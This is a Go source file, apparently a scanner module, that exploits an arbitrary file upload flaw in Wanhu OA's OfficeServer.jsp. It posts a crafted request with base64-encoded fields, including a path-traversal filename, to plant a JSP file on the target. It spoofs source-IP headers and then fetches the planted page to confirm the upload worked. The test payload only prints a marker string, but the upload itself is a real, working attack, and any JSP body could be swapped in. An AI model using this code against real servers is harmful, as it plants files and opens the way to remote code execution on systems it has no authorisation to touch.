package wanhu_officeService

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp"

	requestBody := "DBSTEP V3.0     170              0                1000              DBSTEP=REJTVEVQ\r\n"
	requestBody += "OPTION=U0FWRUZJTEU=\r\n"
	requestBody += "RECORDID=\r\n"
	requestBody += "isDoc=dHJ1ZQ==\r\n"
	requestBody += "moduleType=Z292ZG9jdW1lbnQ=\r\n"
	requestBody += "FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw\r\n"
	requestBody += "111111111111111111111111111111111111111111111111\r\n"

	requestBody += "<%= \"test123\" %>\r\n"

	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":       UA,
			"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"x-forwarded-for":  "127.0.0.1",
			"x-originating-ip": "127.0.0.1",
			"x-remote-ip":      "127.0.0.1",
			"x-remote-addr":    "127.0.0.1",
			"Connection":       "close",
			"Cookie":           "OASESSIONID=847AE3A2E5D155AE7FB1CD2C6736CD66",
		}).
		SetBodyString(requestBody).
		Post(vulnUrl)
	if err == nil && resp.StatusCode == 200 {
		Geturl := url + "/defaultroot/public/edit/cmd_test.jsp"
		reqs, err1 := req.Get(Geturl)
		body1 := reqs.String()
		if err1 == nil && reqs.StatusCode == 200 {
			return strings.Contains(body1, "test123")
		}
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		cheurl := url + "/defaultroot/public/edit/cmd_test.jsp"
		color.Green.Println("[+06] 万户OA OfficeServer.jsp 任意文件上传漏洞存在 -> ", cheurl)
	} else {
		color.Red.Println("[+06] 万户OA OfficeServer.jsp 任意文件上传漏洞不存在")
	}

}
